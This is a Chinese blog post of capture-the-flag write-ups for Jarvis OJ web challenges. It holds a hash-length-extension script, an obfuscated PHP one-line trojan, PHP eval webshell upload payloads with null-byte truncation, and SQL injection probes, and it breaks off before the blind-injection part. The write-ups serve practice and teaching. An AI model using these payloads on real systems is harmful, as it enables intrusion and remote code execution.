<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.5.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/02.png?v=6.5.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/02.png?v=6.5.0">


  <link rel="mask-icon" href="/images/02.png?v=6.5.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.5.0',
    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="flag在管理员手里题目链接：http://web.jarvisoj.com:32778/  只有管理员才能获得flag，你能想办法获得吗？">
<meta property="og:type" content="article">
<meta property="og:title" content="Jarvis OJ(二)">
<meta property="og:url" content="https://cy9nusg4rd3n.github.io/2019/09/27/Jarvis-OJ-二/index.html">
<meta property="og:site_name" content="Cy9nus&#39;s Blog">
<meta property="og:description" content="flag在管理员手里题目链接：http://web.jarvisoj.com:32778/  只有管理员才能获得flag，你能想办法获得吗？">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190916171728.png?raw=true">
<meta property="og:image" content="https://img-blog.csdn.net/20171103001723738?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd3lfOTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
<meta property="og:updated_time" content="2020-04-03T15:06:34.062Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Jarvis OJ(二)">
<meta name="twitter:description" content="flag在管理员手里题目链接：http://web.jarvisoj.com:32778/  只有管理员才能获得flag，你能想办法获得吗？">
<meta name="twitter:image" content="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190916171728.png?raw=true">



  <link rel="alternate" href="/atom.xml" title="Cy9nus's Blog" type="application/atom+xml">




  <link rel="canonical" href="https://cy9nusg4rd3n.github.io/2019/09/27/Jarvis-OJ-二/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Jarvis OJ(二) | Cy9nus's Blog</title>
  











  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-right page-post-detail">
    <div class="headband"></div>
	
    <a href="https://github.com/Cy9nusG4rd3n/Cy9nusG4rd3n.github.io"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
    
	<header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Cy9nus's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">人如果没有梦想，跟咸鱼有什么区别</p>
      
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://cy9nusg4rd3n.github.io/2019/09/27/Jarvis-OJ-二/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Cy9nus">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cy9nus's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Jarvis OJ(二)
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-09-27 20:24:42" itemprop="dateCreated datePublished" datetime="2019-09-27T20:24:42+08:00">2019-09-27</time>
            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/09/27/Jarvis-OJ-二/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2019/09/27/Jarvis-OJ-二/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
             阅读次数： 
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h1><p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p>
<blockquote>
<p>只有管理员才能获得flag，你能想办法获得吗？</p>
</blockquote>
<a id="more"></a>
<ol>
<li>进去现实<strong>Only Admin can see the flag!!</strong></li>
<li><p>抓包发现</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: role=s<span class="number">%3</span>A5<span class="number">%3</span>A<span class="number">%22</span>guest<span class="number">%22</span><span class="number">%3</span>B;</span><br><span class="line"><span class="attribute">hsh</span>=3a4727d57463f122833d9e732f94e4e0</span><br></pre></td></tr></table></figure>
</li>
<li><p>其中role=s:5:”guest”,改为Admin后</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;b&gt;</span>Notice<span class="params">&lt;/b&gt;</span>:  unserialize(): Error at offset <span class="number">11</span> of <span class="number">11</span> bytes in <span class="params">&lt;b&gt;</span><span class="meta-keyword">/opt/</span>lampp<span class="meta-keyword">/htdocs/</span>index.php<span class="params">&lt;/b&gt;</span> on line <span class="params">&lt;b&gt;</span><span class="number">19</span><span class="params">&lt;/b&gt;</span><span class="params">&lt;br /&gt;</span></span><br><span class="line"><span class="params">&lt;h3&gt;</span>Only Admin can see the flag!!<span class="params">&lt;/h3&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>是一个反序列化的报错,估计跟hsh有关，要怎么找呢？</p>
</li>
<li><p>“/index.php~”发现源码泄露,打开乱码,这其实是index.php的备份恢复文件，修改文件名为.index.php.swp，输入命令vim -r index.php得到恢复后的index.php。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web <span class="number">350</span>&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        background:gray;</span><br><span class="line">        text-align:center;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $auth = <span class="keyword">false</span>;</span><br><span class="line">        $role = <span class="string">"guest"</span>;</span><br><span class="line">        $salt =</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">            $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">            $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">            <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">                $auth = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $auth = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $s = serialize($role);</span><br><span class="line">            setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">            $hsh = md5($salt.strrev($s));</span><br><span class="line">            setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>典型的hash拓展长度攻击，但这里不知道salt的长度，需要爆破</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">	m=hashpumpy.hashpump(<span class="string">'3a4727d57463f122833d9e732f94e4e0'</span>,<span class="string">';\"tseug\":5:s'</span>,<span class="string">';\"nimda\":5:s'</span>,i)</span><br><span class="line">	print i		</span><br><span class="line">	url=<span class="string">'http://web.jarvisoj.com:32778/'</span></span><br><span class="line">	digest=m[<span class="number">0</span>]</span><br><span class="line">	</span><br><span class="line">	message=urllib.quote(urllib.unquote(m[<span class="number">1</span>])[::-<span class="number">1</span>])</span><br><span class="line">	cookie=<span class="string">'role='</span>+message+<span class="string">'; hsh='</span>+digest</span><br><span class="line">	<span class="comment">#print cookie</span></span><br><span class="line">	headers=&#123;</span><br><span class="line">	<span class="string">'cookie'</span>: cookie,</span><br><span class="line">	<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line">	<span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">	<span class="string">'Accept-Language'</span>: <span class="string">':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">	<span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span></span><br><span class="line">&#125;</span><br><span class="line">	print headers</span><br><span class="line">	re=requests.get(url=url,headers=headers)</span><br><span class="line">	print re.text</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> re.text:</span><br><span class="line">		print re;</span><br><span class="line">		<span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>最终得到salt长度为12</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">12</span><br><span class="line">&#123;'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'cookie': 'role=s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B; hsh=fcdc3840332555511c4e4323f6decb07', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'&#125;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web 350<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	body &#123;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">background</span><span class="selector-pseudo">:gray</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; <span class="tag">&lt;/<span class="name">h3</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><p>关卡入口：<a href="http://web.jarvisoj.com:32782/" target="_blank" rel="noopener">http://web.jarvisoj.com:32782/</a></p>
<blockquote>
<p>小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？</p>
</blockquote>
<ol>
<li><p>点击管理员登陆按钮</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You don't have permission to access /admin/</span><br><span class="line">on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'you are not admin!'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;script&gt;alert('admin ip is 202.5.19.128')&lt;/script&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>XFF发现没什么用</p>
</li>
<li>再看发现图片的URL如下<blockquote>
<p>proxy.php?url=<a href="http://dn.jarvisoj.com/static/images/proxy.jpg" target="_blank" rel="noopener">http://dn.jarvisoj.com/static/images/proxy.jpg</a></p>
</blockquote>
</li>
<li><p>尝试双重文件包含,构造payload</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32782/proxy</span>.php?url=<span class="symbol">http:</span>/<span class="regexp">/202.5.19.128/proxy</span>.php?url=<span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32782/admin</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">回显:YOU'RE CLOOSING!</span></span><br><span class="line"><span class="regexp">这很坑必须是/admin</span><span class="regexp">/,之前一直试/admin</span>都不行，还以为环境错了</span><br></pre></td></tr></table></figure>
</li>
<li><p>考虑到题目说是一句话木马，所以现在是要找后门</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/robots.txt</span></span><br><span class="line"><span class="section">回显:</span></span><br><span class="line"><span class="section">User-agent: *</span></span><br><span class="line"><span class="section">Disallow:trojan.php</span></span><br><span class="line"><span class="section">Disallow:trojan.php.txt</span></span><br><span class="line"></span><br><span class="line"><span class="section">http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/trojan.php.txt</span></span><br><span class="line"><span class="section">回显:</span></span><br><span class="line">&lt;?php $&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;=(<span class="string">"!"</span>^<span class="string">"`"</span>).(<span class="string">"( "</span>^<span class="string">"&#123;"</span>).(<span class="string">"("</span>^<span class="string">"["</span>).(<span class="string">"~"</span>^<span class="string">";"</span>).(<span class="string">"|"</span>^<span class="string">"."</span>).(<span class="string">"*"</span>^<span class="string">"~"</span>);$&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;((<span class="string">"-"</span>^<span class="string">"H"</span>). (<span class="string">"]"</span>^<span class="string">"+"</span>). (<span class="string">"["</span>^<span class="string">":"</span>). (<span class="string">","</span>^<span class="string">"@"</span>). (<span class="string">"&#125;"</span>^<span class="string">"U"</span>). (<span class="string">"e"</span>^<span class="string">"A"</span>). (<span class="string">"("</span>^<span class="string">"w"</span>).(<span class="string">"j"</span>^<span class="string">":"</span>). (<span class="string">"i"</span>^<span class="string">"&amp;"</span>). (<span class="string">"#"</span>^<span class="string">"p"</span>). (<span class="string">"&gt;"</span>^<span class="string">"j"</span>). (<span class="string">"!"</span>^<span class="string">"z"</span>). (<span class="string">"T"</span>^<span class="string">"g"</span>). (<span class="string">"e"</span>^<span class="string">"S"</span>). (<span class="string">"_"</span>^<span class="string">"o"</span>). (<span class="string">"?"</span>^<span class="string">"b"</span>). (<span class="string">"]"</span>^<span class="string">"t"</span>));?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>看不懂没关系，PHP运行一下</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Notice: Undefined offset: <span class="number">360</span> <span class="keyword">in</span> D:\phpstudy\WWW\trojan.php(<span class="number">1</span>) : <span class="keyword">assert</span> code <span class="keyword">on</span> <span class="literal">line</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="literal">Warning</span>: <span class="keyword">assert</span>(): Assertion <span class="string">"eval($_POST[360])"</span> failed <span class="keyword">in</span> D:\phpstudy\WWW\trojan.php <span class="keyword">on</span> <span class="literal">line</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>菜刀咯</p>
<blockquote>
<p>flag:CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}</p>
</blockquote>
</li>
</ol>
<h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><p>题目入口：<a href="http://web.jarvisoj.com:32785/" target="_blank" rel="noopener">http://web.jarvisoj.com:32785/</a></p>
<blockquote>
<p>“没有什么防护是一个漏洞解决不了的，如果有，那<br>就…..<br>“</p>
</blockquote>
<ol>
<li>有一个图片文件上传功能,提示说只能上传gif&amp;jpg</li>
<li><p>先上一个一句话</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>抓包改后缀php%00.jpg成功上传但菜刀死活连不上</p>
</li>
<li><p>但我们看到View功能是文件包含链接到index.php?page=xxx的</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=uploads/<span class="number">1568382396</span>.jpg</span><br><span class="line">回显：</span><br><span class="line">Warnin<span class="variable">g:</span> fopen(uploads/<span class="number">1568382396</span>.jpg.php): failed <span class="keyword">to</span> <span class="keyword">open</span> stream: No such <span class="keyword">file</span> <span class="built_in">or</span> directory in /<span class="keyword">opt</span>/lampp/htdocs/<span class="built_in">index</span>.php <span class="keyword">on</span> <span class="built_in">line</span> <span class="number">24</span></span><br><span class="line">No such file!</span><br></pre></td></tr></table></figure>
</li>
<li><p>发现jpg后带了php,果断%00截断</p>
<blockquote>
<p>You should not do this!</p>
</blockquote>
</li>
<li><p>估计我们的一句话被过滤了，换下姿势</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;script language="phP"&gt;</span>@eval($_POST[<span class="string">'a'</span>]);<span class="params">&lt;/script&gt;</span></span><br><span class="line"><span class="meta">#这里记住一句话后面不能有内容了，我不知道什么时候手贱多加一点，导致一直不能解析getflag,气死</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//web.jarvisoj.com:32785/index.php?page=uploads/1568385564.gif%00</span></span><br><span class="line"><span class="meta">#CTF&#123;upl0ad_sh0uld_n07_b3_a110wed&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>这里输入payload就getflag了，不用菜刀页也不用找flag路径，估计是题目考图片马，成功解析就行</p>
</li>
</ol>
<h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><p>题目入口：<a href="http://web.jarvisoj.com:32787/" target="_blank" rel="noopener">http://web.jarvisoj.com:32787/</a></p>
<blockquote>
<p>很简单的注入，大家试试？</p>
</blockquote>
<ol>
<li><p>登录框的注入题，账号为admin是提示密码错误，反之则用户名错误，说明用户名为admin，下面进行测试</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin' <span class="meta">#  返回密码错误，说明'#没有过滤</span></span><br><span class="line">admin' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="meta">#  返回用户名错误，说明可能过滤空格和or等关键字</span></span><br><span class="line">admin'<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="meta">#  返回密码错误，说明只过滤空格</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>总结，username存在sql注入，同时仅仅只是过滤了空格，那么就是一个盲注，密码错误即存在，下面给出网上payload<del>还不是自己太菜不会写</del>，理解一下就好</p>
